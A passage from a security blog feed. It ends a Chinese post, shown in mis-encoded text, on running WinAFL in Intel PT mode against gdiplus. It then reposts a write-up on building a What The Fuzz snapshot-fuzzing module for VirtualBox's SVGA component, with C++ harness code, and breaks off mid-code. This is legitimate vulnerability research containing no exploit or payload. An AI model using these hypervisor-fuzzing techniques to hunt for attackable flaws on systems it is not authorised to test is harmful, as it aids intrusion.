class="hljs-punctuation">:</span> <span class="hljs-string">IMM32.DLL</span><br><span class="hljs-attribute">iteration 0</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">uxtheme.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">msctf.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">oleaut32.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">sechost.dll</span><br><span class="hljs-attribute">Iteration finished normally</span><br><span class="hljs-attribute">iteration 1</span><br><span class="hljs-attribute">Iteration finished normally</span><br><span class="hljs-attribute">iteration 2</span><br><span class="hljs-attribute">Iteration finished normally</span><br><span class="hljs-attribute">iteration 3</span><br><span class="hljs-attribute">Iteration finished normally</span><br><span class="hljs-attribute">iteration 4</span><br><span class="hljs-attribute">Iteration finished normally</span><br><span class="hljs-attribute">iteration 5</span><br><span class="hljs-attribute">Iteration finished normally</span><br><span class="hljs-attribute">iteration 6</span><br><span class="hljs-attribute">Iteration finished normally</span><br><span class="hljs-attribute">iteration 7</span><br><span class="hljs-attribute">Iteration finished normally</span><br><span class="hljs-attribute">iteration 8</span><br><span class="hljs-attribute">Iteration finished normally</span><br><span class="hljs-attribute">iteration 9</span><br><span class="hljs-attribute">Iteration finished normally</span><br><span class="hljs-attribute">Coverage map (hex)</span><span class="hljs-punctuation">: </span><br>00000000000000000000000000000000<br>00000000000000000000000000000000<br></code></pre></td></tr></table></figure><h2 id="6-ç”¨-Intel-PT-æ¨¡å¼-fuzz"><a href="#6-ç”¨-Intel-PT-æ¨¡å¼-fuzz" class="headerlink" title="6. ç”¨ Intel PT æ¨¡å¼ fuzz"></a>6. ç”¨ Intel PT æ¨¡å¼ fuzz</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">afl-fuzz.exe -i in -o out -P -t 20000 -- -coverage_module gdiplus.dll ^<br>-coverage_module WindowsCodecs.dll -fuzz_iterations 5000 ^<br>-target_module test_gdiplus.exe -target_offset 0x10E0 -nargs 2 -- test_gdiplus.exe @@<br></code></pre></td></tr></table></figure><p>ç”¨ä¸Šé¢çš„å‘½ä»¤è°ƒç”¨ afl-fuzzï¼Œå‘ç°å¯ä»¥æ­£å¸¸å·¥ä½œï¼Œç•Œé¢å¦‚ä¸‹ï¼š</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">               WinAFL 1.16b based on AFL 2.43b (test_gdiplus.exe)<br><br>+- process timing -------------------------------------+- overall results ----+<br>|<span class="hljs-string">        run time : 0 days, 0 hrs, 0 min, 15 sec       </span>|<span class="hljs-string">  cycles done : 0     </span>|<br>|<span class="hljs-string">   last new path : 0 days, 0 hrs, 0 min, 1 sec        </span>|<span class="hljs-string">  total paths : 9     </span>|<br>|<span class="hljs-string"> last uniq crash : none seen yet                      </span>|<span class="hljs-string"> uniq crashes : 0     </span>|<br>|<span class="hljs-string">  last uniq hang : none seen yet                      </span>|<span class="hljs-string">   uniq hangs : 0     </span>|<br>+- cycle progress --------------------+- map coverage -+----------------------+<br>|<span class="hljs-string">  now processing : 0 (0.00%)         </span>|<span class="hljs-string">    map density : 1.50% / 3.67%        </span>|<br>|<span class="hljs-string"> paths timed out : 0 (0.00%)         </span>|<span class="hljs-string"> count coverage : 1.40 bits/tuple      </span>|<br>+- stage progress --------------------+ findings in depth --------------------+<br>|<span class="hljs-string">  now trying : havoc                 </span>|<span class="hljs-string"> favored paths : 1 (11.11%)            </span>|<br>|<span class="hljs-string"> stage execs : 2332/8192 (28.47%)    </span>|<span class="hljs-string">  new edges on : 5 (55.56%)            </span>|<br>|<span class="hljs-string"> total execs : 3350                  </span>|<span class="hljs-string"> total crashes : 0 (0 unique)          </span>|<br>|<span class="hljs-string">  exec speed : 221.4/sec             </span>|<span class="hljs-string">  total tmouts : 0 (0 unique)          </span>|<br>+- fuzzing strategy yields -----------+---------------+- path geometry -------+<br>|<span class="hljs-string">   bit flips : 0/48, 0/47, 1/45                      </span>|<span class="hljs-string">    levels : 2         </span>|<br>|<span class="hljs-string">  byte flips : 0/6, 0/5, 0/3                         </span>|<span class="hljs-string">   pending : 9         </span>|<br>|<span class="hljs-string"> arithmetics : 1/335, 0/75, 0/0                      </span>|<span class="hljs-string">  pend fav : 1         </span>|<br>|<span class="hljs-string">  known ints : 0/28, 1/168, 1/120                    </span>|<span class="hljs-string"> own finds : 8         </span>|<br>|<span class="hljs-string">  dictionary : 0/0, 0/0, 0/0                         </span>|<span class="hljs-string">  imported : n/a       </span>|<br>|<span class="hljs-string">       havoc : 0/0, 0/0                              </span>|<span class="hljs-string"> stability : 65.28%    </span>|<br>|<span class="hljs-string">        trim : 0.00%/1, 0.00%                        +-----------------------+</span><br><span class="hljs-string">+-----------------------------------------------------+   [cpu000001:  23%]</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h2 id="7-Winafl-çš„å¤šæ ¸ä½¿ç”¨æƒ…å†µ"><a href="#7-Winafl-çš„å¤šæ ¸ä½¿ç”¨æƒ…å†µ" class="headerlink" title="7. Winafl çš„å¤šæ ¸ä½¿ç”¨æƒ…å†µ"></a>7. Winafl çš„å¤šæ ¸ä½¿ç”¨æƒ…å†µ</h2><p>æ‰§è¡Œ Winafl çš„ PT æ¨¡å¼ï¼Œä½¿ç”¨ä»»åŠ¡ç®¡ç†å™¨ -&gt; æ‰“å¼€èµ„æºç›‘è§†å™¨ -&gt;  CPU å¯ä»¥è§‚å¯Ÿåˆ°åªæœ‰ä¸€ä¸ª CPU core è·‘æ»¡ 100%</p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a href="https://github.com/googleprojectzero/winafl/blob/master/README.md">https://github.com/googleprojectzero/winafl/blob/master/README.md</a><br><a href="https://github.com/googleprojectzero/winafl/blob/master/readme_dr.md">https://github.com/googleprojectzero/winafl/blob/master/readme_dr.md</a><br><a href="https://github.com/googleprojectzero/winafl/blob/master/readme_pt.md">https://github.com/googleprojectzero/winafl/blob/master/readme_pt.md</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>When Hypervisor Met Snapshot Fuzzing</title>
    <link href="/cn/2022-07-21-When-Hypervisor-Met-Snapshot-Fuzzing/"/>
    <url>/cn/2022-07-21-When-Hypervisor-Met-Snapshot-Fuzzing/</url>
    
    <content type="html"><![CDATA[<p>source: <a href="https://null2root.github.io/blog/2022/07/21/When-Hypervisor-Met-Snapshot-Fuzzing.html">https://null2root.github.io/blog/2022/07/21/When-Hypervisor-Met-Snapshot-Fuzzing.html</a></p><h1 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1. Introduction"></a>1. Introduction</h1><p>Hypervisor was known as hard target to fuzz over several years. Even though, lots of prior pioneers( <a href="https://rezer0dai.github.io/biug-bounties/">Peter Hlavaty</a>, <a href="https://conference.hitb.org/hitbsecconf2021ams/materials/D2T2%20-%20Discovering%2010+%20Vulnerabilities%20in%20Virtualbox%20-%20Chen%20Nan.pdf">Chaitin Tech</a>, <a href="https://starlabs.sg/blog/2020/04-adventures-in-hypervisor-oracle-virtualbox-research/#coverage-guided-fuzzing">StarLabs</a>, <a href="https://github.com/SafeBreach-Labs/hAFL2">Peleg Hadar and Ophir Harpaz</a> and many others ) doing amazing work to overcome this limit and found interesting bugs.</p><p>But it is not an easy topic for some fresh newbie like me to starts from the bottom. I think manual code( or binary ) auditing and static analysis could be only considerable options if I start my research a few years ago without <strong>What The Fuzz</strong>.</p><p><a href="https://github.com/0vercl0k/wtf">What The Fuzz</a>( a.k.a WTF ) is a snapshot-based fuzzer targeting Windows Ring-3 and Ring-0 component. WTFâ€™s snapshot is based on memory dump both kernel and user-land. Because of that, WTF can not emulate any functionality which requires anything not within in-memory and can not create new process or thread because memory dump limited on single process. But WTF support <a href="https://github.com/0vercl0k/wtf/blob/4a9bf55/src/wtf/bochscpu_backend.cc#L265">breakpoint Handler</a> which you can set breakpoint on <strong>any</strong> address within memory dump and if fuzz execution reaches that address, pre-defined breakpoint handler will be executed. Based on this, we can trying to overcome some limitation on WTF such as <a href="https://github.com/0vercl0k/wtf/blob/main/src/wtf/fshooks.cc">file access</a>.</p><p>I really love WTFâ€™s flexibility and its potential, and I am going to show one of example usage of WTF on targeting Virtualbox to prove how awesome it is.</p><h1 id="2-Developing-Fuzz-Module"><a href="#2-Developing-Fuzz-Module" class="headerlink" title="2. Developing Fuzz Module"></a>2. Developing Fuzz Module</h1><p>First, you should define your own fuzz module for your target. There are few examples on github( <a href="https://github.com/0vercl0k/wtf/blob/main/src/wtf/fuzzer_hevd.cc">fuzzer_hevd.cc</a>, <a href="https://github.com/0vercl0k/wtf/blob/main/src/wtf/fuzzer_tlv_server.cc">fuzzer_tlv_server.cc</a> ) and blog post( <a href="https://blog.ret2.io/2021/07/21/wtf-snapshot-fuzzing/">ret2systems</a>, <a href="https://doar-e.github.io/blog/2021/07/15/building-a-new-snapshot-fuzzer-fuzzing-ida/">Doar-e</a> ). </p><p>My Target was Virtualboxâ€™s <strong>SVGA</strong> component.</p><p>SVGA is something like â€œ<a href="https://www.zerodayinitiative.com/blog/2021/1/6/mindshare-analysis-of-vmware-workstation-and-esxi-using-debug-symbols-from-flings">JavaScript of hypervisors</a>â€œ. Because of its complex nature, many hypervisor bugs are oriented by SVGA. And thatâ€™s the reason why I choose it as a first target.</p><p>VirtualBox have a function called <a href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163/src/VBox/Devices/Graphics/DevVGA-SVGA.cpp#L4505">vmsvgaR3FifoLoop</a>. It <a href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163/src/VBox/Devices/Graphics/DevVGA-SVGA.cpp#L4757">waits</a> until guest submit new command data through GPA. So this is a good spot( or should I call it <a href="https://youtu.be/ZaOtY4i5w_U">source</a>? ) to take a snapshot.</p><p>I set a breakpoint on <code>vmsvgaR3FifoLoop+4E2</code> to take snapshot. It is same position as <a href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163/src/VBox/Devices/Graphics/DevVGA-SVGA.cpp#L4783">here</a>, start of switch-case routine for <a href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163eabe8b7a7f14f29c88c13a458f38fe25e/src/VBox/Devices/Graphics/vmsvga_include/svga_reg.h#L152">SVGA</a> and <a href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163eabe8b7a7f14f29c88c13a458f38fe25e/src/VBox/Additions/3D/mesa/mesa-17.3.9/src/gallium/drivers/svga/include/svga3d_cmd.h#L56">SVGA3D</a> command.</p><p><img src="https://github.com/henices/pictures/raw/master/wtf-vbox-blahblah1.png" alt="blahblah1"></p><p>After creating snapshot, I had to decide make it <a href="https://github.com/0vercl0k/wtf/blob/main/src/wtf/fuzzer_tlv_server.cc">run multiple times in single execution</a> or <a href="https://github.com/0vercl0k/wtf/blob/main/src/wtf/fuzzer_hevd.cc">not</a>. Because SVGA is consist of various commands like define, update, delete somethingâ€¦, I thought fuzz campaign must handle multiple SVGA commands during single round.</p><p>First, I had to define structure to contains multiple testcases. Luckily, <a href="https://twitter.com/0vercl0k">0vercl0k</a> already write <a href="https://github.com/0vercl0k/wtf/blob/4a9bf55/src/wtf/fuzzer_tlv_server.cc#L24-L75">nice example</a> to doing that. So I did same thing as below.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SVGA_CMD_BODY_MAX 0xA000</span><br><br><span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> SvgaCmdList[] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">19</span>, <span class="hljs-number">22</span>, <span class="hljs-number">25</span>, <span class="hljs-number">29</span>, <span class="hljs-number">30</span>, <span class="hljs-number">33</span>, <span class="hljs-number">34</span>, <span class="hljs-number">35</span>, <span class="hljs-number">36</span>, <span class="hljs-number">37</span>, <span class="hljs-number">38</span>, <span class="hljs-number">39</span>, <span class="hljs-number">40</span>, <span class="hljs-number">41</span>, <span class="hljs-number">42</span>, <span class="hljs-number">1040</span>, <span class="hljs-number">1041</span>, <span class="hljs-number">1042</span>, <span class="hljs-number">1043</span>, <span class="hljs-number">1044</span>, <span class="hljs-number">1046</span>, <span class="hljs-number">1047</span>, <span class="hljs-number">1048</span>, <span class="hljs-number">1049</span>, <span class="hljs-number">1050</span>, <span class="hljs-number">1051</span>, <span class="hljs-number">1052</span>, <span class="hljs-number">1053</span>, <span class="hljs-number">1054</span>, <span class="hljs-number">1055</span>, <span class="hljs-number">1056</span>, <span class="hljs-number">1057</span>, <span class="hljs-number">1058</span>, <span class="hljs-number">1059</span>, <span class="hljs-number">1060</span>, <span class="hljs-number">1061</span>, <span class="hljs-number">1062</span>, <span class="hljs-number">1063</span>, <span class="hljs-number">1064</span>, <span class="hljs-number">1065</span>, <span class="hljs-number">1066</span>, <span class="hljs-number">1067</span>, <span class="hljs-number">1068</span>, <span class="hljs-number">1069</span>, <span class="hljs-number">1070</span>, <span class="hljs-number">1071</span>, <span class="hljs-number">1072</span>, <span class="hljs-number">1073</span>, <span class="hljs-number">1074</span>, <span class="hljs-number">1075</span>, <span class="hljs-number">1076</span>, <span class="hljs-number">1077</span>, <span class="hljs-number">1078</span>, <span class="hljs-number">1079</span>, <span class="hljs-number">1080</span>, <span class="hljs-number">1081</span>&#125;;<br><br><span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> SvgaCmdListLen = <span class="hljs-number">58</span>;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">SvgaCmd_t</span> &#123;<br>  <span class="hljs-type">uint32_t</span> SvgaCmdCode;<br>  std::vector&lt;<span class="hljs-type">uint8_t</span>&gt; SvgaBody;<br>  <span class="hljs-built_in">NLOHMANN_DEFINE_TYPE_INTRUSIVE</span>(SvgaCmd_t, SvgaCmdCode, SvgaBody);<br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">SvgaCmds_t</span> &#123;<br>  std::vector&lt;SvgaCmd_t&gt; SvgaCmds;<br>  <span class="hljs-built_in">NLOHMANN_DEFINE_TYPE_INTRUSIVE</span>(SvgaCmds_t, SvgaCmds);<br>&#125;;<br><br><span class="hljs-keyword">struct</span> &#123;<br>  std::deque&lt;SvgaCmd_t&gt; SvgaCmds;<br>  CpuState_t Context;<br>  <span class="hljs-type">uint8_t</span> SvgaCmdBody[SVGA_CMD_BODY_MAX];<br>  <span class="hljs-type">uint32_t</span> SvgaCmdBodySize;<br><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">RestoreGprs</span><span class="hljs-params">(Backend_t *B)</span> </span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;C = Context;<br>    B-&gt;<span class="hljs-built_in">Rsp</span>(C.Rsp);<br>    B-&gt;<span class="hljs-built_in">Rip</span>(C.Rip);<br>    B-&gt;<span class="hljs-built_in">Rax</span>(C.Rax);<br>    B-&gt;<span class="hljs-built_in">Rbx</span>(C.Rbx);<br>    B-&gt;<span class="hljs-built_in">Rcx</span>(C.Rcx);<br>    B-&gt;<span class="hljs-built_in">Rdx</span>(C.Rdx);<br>    B-&gt;<span class="hljs-built_in">Rsi</span>(C.Rsi);<br>    B-&gt;<span class="hljs-built_in">Rdi</span>(C.Rdi);<br>    B-&gt;<span class="hljs-built_in">R8</span>(C.R8);<br>    B-&gt;<span class="hljs-built_in">R9</span>(C.R9);<br>    B-&gt;<span class="hljs-built_in">R10</span>(C.R10);<br>    B-&gt;<span class="hljs-built_in">R11</span>(C.R11);<br>    B-&gt;<span class="hljs-built_in">R12</span>(C.R12);<br>    B-&gt;<span class="hljs-built_in">R13</span>(C.R13);<br>    B-&gt;<span class="hljs-built_in">R14</span>(C.R14);<br>    B-&gt;<span class="hljs-built_in">R15</span>(C.R15);<br>  &#125;<br>&#125; GlobalState;<br><br><span class="hljs-function">SvgaCmds_t <span class="hljs-title">Deserialize</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> *Buffer, <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> BufferSize)</span> </span>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;Root = json::json::<span class="hljs-built_in">parse</span>(Buffer, Buffer + BufferSize);<br>  <span class="hljs-keyword">return</span> Root.<span class="hljs-built_in">get</span>&lt;SvgaCmds_t&gt;();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">InsertTestcase</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> *Buffer, <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> BufferSize)</span> </span>&#123;<br>  GlobalState.SvgaCmds.<span class="hljs-built_in">clear</span>();<br><br>  <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;Root = <span class="hljs-built_in">Deserialize</span>(Buffer, BufferSize);<br>  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> SvgaCmd : Root.SvgaCmds) &#123;<br>    GlobalState.SvgaCmds.<span class="hljs-built_in">emplace_back</span>(std::<span class="hljs-built_in">move</span>(SvgaCmd));<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>It is almost identical as example.</p><p>Next question was, how can I insert data into snapshot? I had to find a insertion point and proper memory address. Luckily( again ), VirtualBox using a function called <a href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163/src/VBox/Devices/Graphics/DevVGA-SVGA.cpp#L4183">vmsvgaR3FifoGetCmdPayload</a> to receive command data from guest to host. I define a breakpoint handler in <code>Init()</code> callback function as below.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//</span><br><span class="hljs-comment">// unsigned __int8 *__fastcall vmsvgaR3FifoGetCmdPayload(</span><br><span class="hljs-comment">//       unsigned int cbPayloadReq,</span><br><span class="hljs-comment">//       volatile unsigned int *pFIFO,</span><br><span class="hljs-comment">//       unsigned int offCurrentCmd,</span><br><span class="hljs-comment">//       unsigned int offFifoMin,</span><br><span class="hljs-comment">//       unsigned int offFifoMax,</span><br><span class="hljs-comment">//       unsigned __int8 *pbBounceBuf,</span><br><span class="hljs-comment">//       unsigned int *pcbAlreadyRead,</span><br><span class="hljs-comment">//       PDMTHREAD *pThread,</span><br><span class="hljs-comment">//       VGAState *pThis,</span><br><span class="hljs-comment">//       VMSVGAR3STATE *pSVGAState,</span><br><span class="hljs-comment">//       PDMDEVINSR3 *pDevIns)</span><br><span class="hljs-comment">//</span><br><span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">Setbreakpoint</span>(<span class="hljs-string">&quot;VBoxDD!vmsvgaR3FifoGetCmdPayload&quot;</span>, [](Backend_t *Backend) &#123;<br>  <span class="hljs-type">uint32_t</span> cbPayloadReq = Backend-&gt;<span class="hljs-built_in">GetArg</span>(<span class="hljs-number">0</span>);<br>  Gva_t pbBounceBuf_gva = Backend-&gt;<span class="hljs-built_in">GetArgGva</span>(<span class="hljs-number">5</span>);<br>  Gva_t pcbAlreadyRead_gva = Backend-&gt;<span class="hljs-built_in">GetArgGva</span>(<span class="hljs-number">6</span>);<br><br>  <span class="hljs-keyword">if</span>(cbPayloadReq &gt; GlobalState.SvgaCmdBodySize) &#123;<br>    <span class="hljs-built_in">DebugPrint</span>(<span class="hljs-string">&quot;cbpayloadReq(&#123;:#x&#125;) &gt; SvgaCmdBodySize(&#123;:#x&#125;), restore context and goto next round\n&quot;</span>, cbPayloadReq, GlobalState.SvgaCmdBodySize);<br>    <span class="hljs-keyword">return</span> GlobalState.<span class="hljs-built_in">RestoreGprs</span>(Backend);<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span>(cbPayloadReq &gt; u32PbBounceBufMaxSize) &#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> RetAddr = Backend-&gt;<span class="hljs-built_in">VirtRead8</span>(<span class="hljs-built_in">Gva_t</span>(Backend-&gt;<span class="hljs-built_in">Rsp</span>()));<br>    <span class="hljs-built_in">DebugPrint</span>(<span class="hljs-string">&quot;check this, RetAddr = &#123;:#x&#125;\n&quot;</span>, RetAddr);<br>    std::<span class="hljs-built_in">abort</span>();<br>  &#125;<br><br>  <span class="hljs-keyword">if</span>(!Backend-&gt;<span class="hljs-built_in">VirtWriteDirty</span>(pbBounceBuf_gva, GlobalState.SvgaCmdBody, cbPayloadReq)) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to write pbBounceBuf, pbBounceBuf = &#123;:#x&#125;, cbPayloadReq = &#123;:#x&#125;, SvgaCmdBodySize = &#123;:#x&#125;\n&quot;</span>,<br>                pbBounceBuf_gva.<span class="hljs-built_in">U64</span>(), cbPayloadReq, GlobalState.SvgaCmdBodySize);<br>    std::<span class="hljs-built_in">abort</span>();<br>  &#125;<br><br>  <span class="hljs-keyword">if</span>(!Backend-&gt;<span class="hljs-built_in">VirtWriteStructDirty</span>(pcbAlreadyRead_gva, &amp;cbPayloadReq)) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Faile to write pcbAlreadyRead, pcbAlreadyRead = &#123;:#x&#125;\n&quot;</span>, pcbAlreadyRead_gva.<span class="hljs-built_in">U64</span>());<br>    std::<span class="hljs-built_in">abort</span>();<br>  &#125;<br><br>  Backend-&gt;<span class="hljs-built_in">SimulateReturnFromFunction</span>(pbBounceBuf_gva.<span class="hljs-built_in">U64</span>());<br><br>&#125;)) &#123;<br>  fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to Setbreakpoint on VBoxDD!vmsvgaR3FifoGetCmdPayload\n&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>I also had to define end point of execution. After some reversing, I found two spots and using it as end point.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">const</span> Gva_t SvgaLoopEnd = <span class="hljs-built_in">Gva_t</span>(g_Dbg.<span class="hljs-built_in">GetSymbol</span>(<span class="hljs-string">&quot;VBoxDD!vmsvgaR3FifoLoop&quot;</span>) + <span class="hljs-number">0x24AB</span>);<br><span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">Setbreakpoint</span>(SvgaLoopEnd, [](Backend_t *Backend) &#123;<br>  <span class="hljs-built_in">DebugPrint</span>(<span class="hljs-string">&quot;loop end reached, restore context\n&quot;</span>);<br>  GlobalState.<span class="hljs-built_in">RestoreGprs</span>(g_Backend);<br>&#125;)) &#123;<br>  fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to Setbreakpoint on SvgaLoopEnd\n&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-type">const</span> Gva_t SvgLoopEnd2 = <span class="hljs-built_in">Gva_t</span>(g_Dbg.<span class="hljs-built_in">GetSymbol</span>(<span class="hljs-string">&quot;VBoxDD!vmsvgaR3FifoLoop&quot;</span>) + <span class="hljs-number">0x24B2</span>);<br><span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">Setbreakpoint</span>(SvgLoopEnd2, [](Backend_t *Backend) &#123;<br>  <span class="hljs-built_in">DebugPrint</span>(<span class="hljs-string">&quot;loop end2 reached, restore context\n&quot;</span>);<br>  GlobalState.<span class="hljs-built_in">RestoreGprs</span>(g_Backend);<br>&#125;)) &#123;<br>  fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to Setbreakpoint on SvgLoopEnd2\n&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>As I said above, I create a snapshot on <code>vmsvgaR3FifoLoop+4E2</code>. So if I restore register context, next execution flow starts from there. Because of that, I had to parse new testcase using breakpoint Handler.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">const</span> Gva_t SvgaLoopStart = <span class="hljs-built_in">Gva_t</span>(g_Dbg.<span class="hljs-built_in">GetSymbol</span>(<span class="hljs-string">&quot;VBoxDD!vmsvgaR3FifoLoop&quot;</span>) + <span class="hljs-number">0x4e2</span>);<br><span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">Setbreakpoint</span>(SvgaLoopStart, [](Backend_t *Backend) &#123;<br>  <span class="hljs-keyword">if</span>(GlobalState.SvgaCmds.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">DebugPrint</span>(<span 